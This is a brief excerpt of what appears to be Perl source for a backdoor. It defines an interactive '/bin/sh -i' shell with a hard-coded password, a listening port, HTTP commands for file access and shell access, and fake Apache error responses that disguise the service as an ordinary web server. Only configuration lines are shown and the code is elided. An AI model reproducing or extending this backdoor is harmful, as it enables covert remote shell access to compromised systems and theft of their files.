...
our $SHELL="/bin/sh -i";
our $SHELLPASSWORD="skides";
our $LISTENPORT="8080";
our $HTTPFILECMD="file";
our $HTTPSHELLCMD="shell";

our $HTTP404= "HTTP/1.1 404 Not Found\n" .
...
our $HTTP400= "HTTP/1.1 400 Bad Request\n" .
"Server: Apache/1.3.22 (Unix)\n" .
"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
